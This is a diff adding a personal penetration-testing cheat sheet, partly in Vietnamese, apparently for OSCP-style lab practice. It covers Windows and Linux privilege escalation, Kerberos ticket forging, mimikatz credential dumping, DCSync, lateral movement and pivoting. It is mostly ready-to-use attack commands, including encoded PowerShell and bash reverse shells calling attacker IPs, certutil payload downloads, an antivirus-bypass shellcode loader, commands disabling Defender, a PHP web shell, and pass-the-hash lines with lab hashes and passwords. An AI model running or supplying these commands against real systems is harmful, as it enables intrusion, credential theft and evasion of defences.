@@ -1,0 +1,645 @@
+# Nên thử bỏ hostname/name box/... vào url: Máy tên shenzi -> http://IP:PORT/shenzi
+
+# File Upload extension bypass:
+1. User `php#.png` extension for php file
+2. Image: `GIF89a`
+3. PDF: `%PDF-`
+
+![[afbba58cef874e4e86eac15a9238b6cc.png]]
+# Windows Privesc todolist: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#putty-creds
+## Gather Info:
+- [ ] Username and hostname
+- [ ] Group memberships of the current user
+- [ ] Existing users and groups
+- [ ] Operating system, version and architecture
+- [ ] Network information
+- [ ] Installed applications
+- - `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
+- - `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
+- - `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s`
+- [ ] Running processes
+
+## AlwaysInstallElevated: 
+1.1. `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+1.2. `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
+-> **Nếu cả hai đều mang giá trị 0x1 thì có thể tấn công!**
+
+2. `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.208 LPORT=4444 -f msi > rev4444.msi`
+3. `certutil -urlcache -split -f http://192.168.45.208:8000/rev4444.msi C:\users\public\rev4444.msi`
+4. `msiexec /quiet /qn /i C:\Users\public\rev4444.msi`
+
+## Service Binary Hijacking:
+[[d0096c77451141468f0bf65943f2e06e.c]]
+
+- List services:
+- - `net start`
+- - `wmic service list brief`
+- - `sc query`
+- - `Get-Service`
+- - `services`
+
+- `sc.exe qc AmazonSSMAgent`
+
+- Liệt kê dịch vụ cùng đường dẫn:
+`Get-CimInstance -ClassName win32_service | Select Name,State,PathName`
+
+- Liệt kê dịch vụ cùng đường dẫn đang chạy:
+`Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
+-> Kiểm tra xem có binary nào nằm ở các folder lạ.(Path mặc định là "C:\windonws\system32\")
+
+- Kiểm tra quyền của tệp nhị phân:
+`icacls <PATH>`
+<table><thead><tr><th>MASK</th><th>PERMISSIONS</th></tr></thead><tbody><tr><td>F</td><td>Full access</td></tr><tr><td>M</td><td>Modify access</td></tr><tr><td>RX</td><td>Read and execute access</td></tr><tr><td>R</td><td>Read-only access</td></tr><tr><td>W</td><td>Write-only access</td></tr></tbody></table>
+
+- Kiểm tra StartMode của dịch vụ auto/manual/...:
+`Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}`
+
+## DLL Hijacking:
+`$env:path`
+[[dedce826d29642da9e9fca3333995f07.c]]
+- Tương tự Service Binary Hijacking, nhưng nhị phân không có quyền sửa đổi, tuy nhiên DLL nạp cho nhị phân ở thư mục không trích dẫn "unquoted" hoặc ở thư mục người dùng có quyền sửa đổi, hoặc đường dẫn thuộc ENV...
+
+## Unquoted Service Paths:
+- Tương tự Service Binary Hijacking/DLL Hijacking, tìm dịch vụ nhưng trong PathName có chứa khoảng trắng " " và không nằm trong nháy đôi("). dùng icacls kiểm từng thư mục trong PathName để xác định thư mục người dùng có quyền Write. Từ đó ghi đè/tạo tệp giả mạo. Ví dụ đường dẫn là **C:\A Folder\B Folder\C Folder\service.exe** mà tại **B Folder** tôi mới có quyền W thì sẽ ghi tệp độc hại tại **C:\A Folder\B Folder\C.exe** sau đó thực hiện *Start-Service*
+
+## Reconfig services:
+`sc.exe qc AmazonSSMAgent`
+`sc.exe config AmazonSSMAgent binpath="net localgroup administrators j.rock /add"`
+
+## Schedule Tasks:
+- Liệt kê tác vụ được lên lịch trình:
+`schtasks /query /fo LIST /v`
+- - My command: `schtasks /query /fo LIST /v | select-string "Task To Run" | sort-object|get-unique`
+
+## Priv: SeImpersonatePrivilege
+`.\PrintSpoofer64.exe -i -c powershell.exe`
+`.\PrintSpoofer64.exe -i -c rev.exe`
+`.\JuicyPotatoNG.exe -t * -p "C:\windows\system32\cmd.exe" -a "/c C:\users\public\rev8888.exe"`
+`.\JuicyPotatoNG.exe -t * -p "C:\windows\system32\cmd.exe" -a "/c powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAyACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="`
+
+## Priv: SeBackupPrivilege
+- `import-module C:\users\enterpriseuser\SeBackupPrivilegeUtils.dll`
+- `import-module C:\users\enterpriseuser\SeBackupPrivilegeCmdLets.dll`
+- `reg save HKLM\SYSTEM C:\system.hive`
+- `reg save HKLM\SAM C:\sam.hive`
+- `Copy-FileSeBackupPrivilege C:\system.hive C:\users\enterpriseuser\system.hive`
+- `Copy-FileSeBackupPrivilege C:\sam.hive C:\users\enterpriseuser\sam.hive`
+
+`secretsdump.py -system ./system.hive -sam ./sam.hive local`
+
+## Priv: SeMachineAccountPrivilege
+- `python noPac/noPac.py 'aoc.local/vansprinkles' -hashes 00000000000000000000000000000000:03E805D8A8C5AA435FB48832DAD620E3 -dc-ip 10.10.64.116 -shell --impersonate administrator -use-ldap -no-pass`
+
+
+## Kerberos:
+### AS-REP Roasting:
+1. Windows: `.\Rubeus.exe asreproast /nowrap`
+2. Linux: `GetNPUsers.py -dc-ip 192.168.195.70  -request -outputfile hashes.asreproast corp.com/pete`
+
+### Kerberoasting:
+1. Windows: `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
+2. Linux: `GetUserSPNs.py -request -dc-ip 192.168.50.70 corp.com/pete`
+
+## Silver Ticket:
+`.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"`
+-> Lấy NTLM của user; SID của user(không cần RID, ví dụ: **S-1-5-21-1987370270-658905905-1781884369**-1105)
+`.\mimikatz.exe "privilege::debug" "token::elevate" "kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin" "exit"`
+
+## Golden Ticket:
+***Cần lấy NTLM của krbtgt và Domain SID(Ví dụ dùng `lsadump::lsa /patch`)***
+`.\mimikatz.exe "privilege::debug" "kerberos::purge"`
+`kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt`
+-> Thành công có thể truy cập mọi tài nguyên với đặc quyền cao nhất AD. Nên tới DC để kiểm soát toàn miền(`.\psexec.exe \\dc1 cmd.exe`)
+
+## dcsync attack:
+1. Windows: `.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:corp\krbtgt" "exit"`
+2. Linux: `secretsdump.py -just-dc-user krbtgt corp.com/jeffadmin:'BrouhahaTungPerorateBroom2023!'@192.168.195.70`
+
+## Lateral Movement:
+### Overpass the hash:
+`.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"`
+-> Lấy NTLM
+`sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell`
+`.\PsExec.exe \\files04 cmd` (Hoặc dùng rev.exe)
+
+### Pass the ticket:
+`.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"`
+`dir *.kirbi`
+-> Lấy tên tệp kirbi phù hợp
+`.\mimikatz.exe "privilege::debug" "kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi" "exit"`
+
+### DCOM:
+`$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.197.72"));$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7");$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==","7")`
+
+## Shadow:
+### No Creds:
+#### Manual:
+[[8b96cae6e394433a832332a3ddb3eafa.txt]]
+`mkdir c:\tmp`
+`diskshadow.exe /s C:\users\Administrator\Desktop\diskshadow.txt`
+`cmd.exe /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit`
+`reg.exe save hklm\system c:\system.bak`
+
+#### Automation:
+`vshadow.exe -nw -p  C`
+`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`
+`reg.exe save hklm\system c:\system.bak`
+
+# Linux Privesc:
+## My habit flow:
+`sudo -l`
+`find / -perm -u=s 2>>/dev/null`
+`getcap -r / 2>>/dev/null`
+
+`find / -perm /4000 2>>/dev/null`
+
+## `uname -a` version in 5.8 < 5.16.11
+https://github.com/Al1ex/CVE-2022-0847/blob/main/exp.c or [[e4352a57a682491a9245d6b24c9a3cdf.c]]:  `./exp /etc/passwd 1 ootz:`
+
+## Shared library / .so :
+\# include <stdio.h>
+\# include <stdlib.h>
+\# include <sys/types.h>
+static void kashz() \_\_attribute__((constructor));
+void kashz() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("chmod +s /usr/bin/find");
+}
+
+`gcc -shared -o utils.so -fPIC priv.c`
+
+## PwnKit/Polkit - CVE-2021-4034:
+
+## tar - Wildcard Spare:
+`echo 'echo "spooky ALL=(root) NOPASSWD:ALL" > /etc/sudoers' > rev.sh`
+`echo "" > "--checkpoint=1"`
+`echo "" > "--checkpoint-action=exec=sh rev.sh"`
+
+## Postgres >= 9.3:
+0. `DROP TABLE IF EXISTS cmd_exec;`
+1. `CREATE TABLE cmd_exec(cmd_output text);`
+2. `COPY cmd_exec FROM PROGRAM '/bin/bash -i >& /dev/tcp/192.168.45.208/80 0>&1';`
+3. `SELECT * FROM cmd_exec;`
+4. `DROP TABLE IF EXISTS cmd_exec;`
+
+## Service (Overwrite/Inject): 
+\* ***Must have some way to restart/reload service(systemctl, reboot,...)***
+- `ExecStart=/home/cmeeks/priv.sh`
+- `User=root`
+
+# Nmap:
+`sudo nmap -Pn -p- -sSCV -A -O -T5 --min-parallel=4096 -oN ./nmap.txt 192.168.175.40`
+`sudo nmap -p139,445 --min-parallel=4096 192.168.175.40 --script=smb-vuln*`
+`sudo nmap -sU -T4 -F --version-intensity 0 <IP>`
+`sudo nmap -Pn -sU -T4 -oN ./nmap_udp.txt 192.168.175.40`
+
+# Proxy
+`feroxbuster -u http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,bak,zip,html,php -t 200 --proxy socks5://127.0.0.1:1080`
+
+`export HYDRA_PROXY=socks5://127.0.0.1:1080`
+
+# SSH:
+**SSH login negotiation errors:**
+{
+echo -n 'Ciphers '
+ssh -Q cipher | tr '\n' ',' | sed -e 's/,$//'; echo
+
+echo -n 'MACs '
+ssh -Q mac | tr '\n' ',' | sed -e 's/,$//'; echo
+
+echo -n 'HostKeyAlgorithms '
+ssh -Q key | tr '\n' ',' | sed -e 's/,$//'; echo
+
+echo -n 'KexAlgorithms '
+ssh -Q kex | tr '\n' ',' | sed -e 's/,$//'; echo
+
+} >> ~/.ssh/config
+
+# AD:
+- ***NT hoặc LM là cho cục bộ dump từ reg SAM/SECURITY... bởi mimikatz...; NetNTLM-v2 là giao thức bắt qua responder***
+
+`psexec.py tris@10.11.1.20 -hashes 00000000000000000000000000000000:08df3c73ded940e1f2bcf5eea4b8dbf6`
+
+`psexec.py xor-app59.xor.com/administrator@10.11.1.123 -hashes 00000000000000000000000000000000:3fee04b01f59a1001a366a7681e95699`
+
+`smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b`
+
+`impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`
+
+`impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`
+
+`runas /user:<username> cmd`
+
+# Mount:
+`showmount -e `
+
+`Sudo mount -t cifs //10.11.1.136/'Bob Share' /home -o rw,vers=1.0,dir_mode=0777,file_mode=0666,nounix`
+
+`sudo mount -t drvfs C: /mnt/c`
+
+# Cronjob:
+`crontab -l`
+`ls -al /etc/cron* /etc/at*`
+`cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"`
+
+# LFI:
+`php://filter/convert.base64-encode/resource=../../../../../../../../../var/log/apache2/access.log`
+
+`<?php echo system($_GET["cmd"]);?>` 
+
+`data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a`
+
+- IIS LFI: 
+- - `./.././.././.././.././.././../inetpub/wwwroot/appsettings.json`
+- `./.././.././.././.././.././../inetpub/wwwroot/<appname>/appsettings.json`
+
+# Antivirus:
+## Policy on Powershell:
+### Change Policy:
+- For test current policy: `Get-ExecutionPolicy -Scope CurrentUser`
+- For change policy to Unrestricted: `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`
+
+### Bypass AV ps1:
+<div class='code'>&dollar;code &equals; &apos;<br>&lsqb;DllImport&lpar;&quot;kernel32&period;dll&quot;&rpar;&rsqb;<br>public static extern IntPtr VirtualAlloc&lpar;IntPtr lpAddress&comma; uint dwSize&comma; uint flAllocationType&comma; uint flProtect&rpar;&semi;<br><br>&lsqb;DllImport&lpar;&quot;kernel32&period;dll&quot;&rpar;&rsqb;<br>public static extern IntPtr CreateThread&lpar;IntPtr lpThreadAttributes&comma; uint dwStackSize&comma; IntPtr lpStartAddress&comma; IntPtr lpParameter&comma; uint dwCreationFlags&comma; IntPtr lpThreadId&rpar;&semi;<br><br>&lsqb;DllImport&lpar;&quot;msvcrt&period;dll&quot;&rpar;&rsqb;<br>public static extern IntPtr memset&lpar;IntPtr dest&comma; uint src&comma; uint count&rpar;&semi;&apos;&semi;<br><br>&dollar;winFunc &equals; <br>  Add-Type -memberDefinition &dollar;code -Name &quot;Win32&quot; -namespace Win32Functions -passthru&semi;<br><br>&lsqb;Byte&lsqb;&rsqb;&rsqb;&semi;<br>&lsqb;Byte&lsqb;&rsqb;&rsqb;&dollar;sc &equals; &lt;place your shellcode here&gt;&semi;<br><br>&dollar;size &equals; 0x1000&semi;<br><br>if &lpar;&dollar;sc&period;Length -gt 0x1000&rpar; &lcub;&dollar;size &equals; &dollar;sc&period;Length&rcub;&semi;<br><br>&dollar;x &equals; &dollar;winFunc&colon;&colon;VirtualAlloc&lpar;0&comma;&dollar;size&comma;0x3000&comma;0x40&rpar;&semi;<br><br>for &lpar;&dollar;i&equals;0&semi;&dollar;i -le &lpar;&dollar;sc&period;Length-1&rpar;&semi;&dollar;i&plus;&plus;&rpar; &lcub;&dollar;winFunc&colon;&colon;memset&lpar;&lsqb;IntPtr&rsqb;&lpar;&dollar;x&period;ToInt32&lpar;&rpar;&plus;&dollar;i&rpar;&comma; &dollar;sc&lsqb;&dollar;i&rsqb;&comma; 1&rpar;&rcub;&semi;<br><br>&dollar;winFunc&colon;&colon;CreateThread&lpar;0&comma;0&comma;&dollar;x&comma;0&comma;0&comma;0&rpar;&semi;for &lpar;&semi;&semi;&rpar; &lcub; Start-sleep 60 &rcub;&semi;</div>
+
+## Create Base64 Encoded Script for powershell:
+`pwsh`
+<div class='code'>$Myscript = @'
+$client = New-Object System.Net.Sockets.TCPClient('192.168.45.194',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+'@</div>
+<div class='code'>$MyEncodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MyScript))</div>
+<div class='code'>write-host $MyEncodedScript</div>
+
+# NTLMReplay:
+Victim payload: `dir \\<attacker's ip>\<nonexists file>`
+
+`sudo ntlmrelayx.py --no-http-server -smb2support -t 192.168.194.212 -c "powershell -enc <powershell's script base64 encoded>`
+
+<style>
+	.note{
+		color: red;
+		border-style: solid;
+		border-width: 1px 0px 1px 0px;
+		padding: 5px 30px 5px 30px;
+	}
+	.code{
+		font-family: "hack";
+		border-style: dotted;
+		border-width: 2px ;
+		padding: 5px 20px 5px 20px;
+	}
+</style>
+
+
+# Pivot:
+## Socat:
+`socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432`
+`socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`
+
+## Plink:
+`plink.exe -ssh -l yuiw -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.208`
+
+## Netsh:
+`netsh advfirewall firewall show rule name=all`
+
+## SSH:
+- Local: `ssh -N -L <ip_on_victim>:<new_port>:<ip_on_victim>:<port_exists> <user>@<ip>`
+- Remote: `ssh -N -R <user>@<ip>`
+- Dynamic: `ssh -N -D <user>@<ip>`
+- Dynamic Remote: `ssh -N -D <user>@<ip>`
+
+## Chisel:
+`chisel server -p <port> --reverse`
+`chisel client <server_ip>:<server_port> R:socks`
+
+## Double Chisel:
+1. Attacker: 
+- /etc/proxychains:
+- - socks5 127.0.0.1 9999
+- `chisel server -p <port0> --reverse --socks5`
+2. First Victim(First DMZ):
+- `chisel client <attacker_ip>:<port0> R:9999:socks`
+- `chisel server -p <port1> --reverse --socks5`
+- /etc/proxychains:
+- - socks5 127.0.0.1 9999
+- - socks5 127.0.0.1 8888
+3. Second Victim(Second DMZ):
+- `chisel client <first_dmz_ip>:<port1> R:8888:socks`
+
+
+## Netsh:
+`netsh interface portproxy add v4tov4 listenaddress=<ip> listenport=<port> connectaddress=<tgt_ip> connectport=<tgt_port>`
+
+# xfreerdp:
+`xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.208.64`
+`xfreerdp /u:administrator /d:svclient08.svcorp.com /pth:ee0c207898a5bccc01f38115019ca2fb /v:10.11.1.22`
+`xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75`
+
+`xfreerdp /cert-ignore /u:emma /d:external /p:"SomersetVinyl1!" /v:192.168.196.248 /drive:yuiw,/home/<...>/share`
+
+
+# note
+- Disable RDP within password: When be restricted to account have no password seted
+`REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f`
+
+- Disable Defender:
+- -  `Set-MpPreference -DisableRealtimeMonitoring $true`
+- - `REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f`
+
+`net user yuiw <password> /add; net localgroup "administrators" yuiw /add; net localgroup "Remote Desktop Users" yuiw /add`
+
+- Download: `(New-Object System.Net.WebClient).DownloadFile('http://192.168.45.184:8000/windows-resources/mimikatz/x64/mimikatz.exe', 'c:\users\public\mimikatz.exe')`
+
+- Php reverse windows: [[cf01c1bfb2cc4a3bb8c6d7da3a93ad81.php]]
+
+- Grant file/folder: `icacls C:\Users\emma\* /grant mark:F /T` (In administrator shell)
+
+- Winpeas: `REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`
+
+- Tìm file:
+`Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
+
+- Liệt kê file ẩn: `dir /a:h`
+
+`net view \\dc01 /all`
+
+`mssqlclient.py Administrator:Lab123@192.168.203.18 -port 1433 -windows-auth`
+
+[[21219f9e83d14654aecdc767946f1f26.py]]
+
+**Apache 2.4.49/2.4.50**: use CVE-2021-41773 / CVE-2021-42013 at *~/Downloads/Path-traversal-RCE-Apache-2.4.49-2.4.50-Exploit*
+
+**Umbraco 7.12.4**  [[59b06d4a1ec740a3856147f013c8c16a.py]]
+
+- Share để có thể transfer file từ victim: `impacket-smbserver -smb2support share /tmp`
+- - `copy \\ip.of.my.kali\share\mimikatz.exe C:\temp\ `
+
+`certutil.exe -urlcache -split -f http://192.168.45.230/PsExec64.exe PsExec64.exe`
+
+`net user /domain`
+`net user <username> /domain`
+`net group /domain`
+`net group <groupname> /domain`
+<div class='code'>&dollar;domainObj &equals; &lsqb;System&period;DirectoryServices&period;ActiveDirectory&period;Domain&rsqb;&colon;&colon;GetCurrentDomain&lpar;&rpar;<br>&dollar;PDC &equals; &dollar;domainObj&period;PdcRoleOwner&period;Name<br>Write-Output &dollar;domainObj<br>Write-Output &dollar;PDC<br><br>&dollar;DN &equals; &lpar;&lsqb;adsi&rsqb;&apos;&apos;&rpar;&period;distinguishedName<br>Write-Output &dollar;DN<br><br>&dollar;LDAP &equals; &quot;LDAP&colon;&sol;&sol;&dollar;PDC&sol;&dollar;DN&quot;<br>Write-Output &dollar;LDAP</div>
+
+`net accounts` (Kiểm tra/đặt Policy)
+
+`scp -O -i id_rsa /home/yuiw/.ssh/id_rsa.pub max@192.168.248.100:/home/max/.ssh/authorized_keys` (-O nếu scp: Received message too long / scp: Ensure the remote shell produces no output for non-interactive sessions.)
+
+#### Use LDAPSearch function for enum: 
+<div class='code'>function LDAPSearch &lcub;<br>    param &lpar;<br>        &lsqb;string&rsqb;&dollar;LDAPQuery<br>    &rpar;<br><br>    &dollar;PDC &equals; &lsqb;System&period;DirectoryServices&period;ActiveDirectory&period;Domain&rsqb;&colon;&colon;GetCurrentDomain&lpar;&rpar;&period;PdcRoleOwner&period;Name<br>    &dollar;DistinguishedName &equals; &lpar;&lsqb;adsi&rsqb;&apos;&apos;&rpar;&period;distinguishedName<br><br>    &dollar;DirectoryEntry &equals; New-Object System&period;DirectoryServices&period;DirectoryEntry&lpar;&quot;LDAP&colon;&sol;&sol;&dollar;PDC&sol;&dollar;DistinguishedName&quot;&rpar;<br><br>    &dollar;DirectorySearcher &equals; New-Object System&period;DirectoryServices&period;DirectorySearcher&lpar;&dollar;DirectoryEntry&comma; &dollar;LDAPQuery&rpar;<br><br>    return &dollar;DirectorySearcher&period;FindAll&lpar;&rpar;<br><br>&rcub;</div>
+
+`import-module .\sc.ps1`
+`LDAPSearch -LDAPQuery "(samAccountType=805306368)"` 
+`LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"`
+`LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))".properties`
+
+#### PowerView.ps1:
+`Get-NetDomain`
+`Get-NetUser`
+`Get-NetGroup`
+`Get-NetComputer`
+
+`Find-LocalAdminAccess`
+`Get-NetSession -ComputerName <computername> -Verbose`
+`Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl` (*dont need PowerView)
+
+`Find-DomainShare`
+
+
+#### Ldap:
+- `ldapsearch -x -H ldap://192.168.175.122 -D '' -w '' -b "DC=hutch,DC=offsec"`
+- `kerbrute userenum --dc hutch.offsec -d hutch.offsec users.txt`
+- `bloodhound-python  -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.175.122`
+- `ldapdomaindump -u "corp.com\stephanie" -p 'LegmanTeamBenzoin!!' 192.168.240.70`
+
+- `.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"`
+
+- ReadLAPS:
+- - `ldapsearch -x -H ldap://192.168.175.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
+
+
+#### Sharphound:
+`Import-Module ./Sharphound.ps1; Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"`
+
+
+#### Check cred by Powershell:
+<div class='code'>&dollar;domainObj &equals; &lsqb;System&period;DirectoryServices&period;ActiveDirectory&period;Domain&rsqb;&colon;&colon;GetCurrentDomain&lpar;&rpar;<br>  <br>&dollar;PDC &equals; &lpar;&dollar;domainObj&period;PdcRoleOwner&rpar;&period;Name<br><br>&dollar;SearchString &equals; &quot;LDAP&colon;&sol;&sol;&quot;<br><br>&dollar;SearchString &plus;&equals; &dollar;PDC &plus; &quot;&sol;&quot;<br><br>&dollar;DistinguishedName &equals; &quot;DC&equals;&dollar;&lpar;&dollar;domainObj&period;Name&period;Replace&lpar;&apos;&period;&apos;&comma; &apos;&comma;DC&equals;&apos;&rpar;&rpar;&quot;<br><br>&dollar;SearchString &plus;&equals; &dollar;DistinguishedName<br><br>New-Object System&period;DirectoryServices&period;DirectoryEntry&lpar;&dollar;SearchString&comma; &quot;pete&quot;&comma; &quot;Nexus123&excl;&quot;&rpar;</div>
+-> If username/password both correct it will return directory:
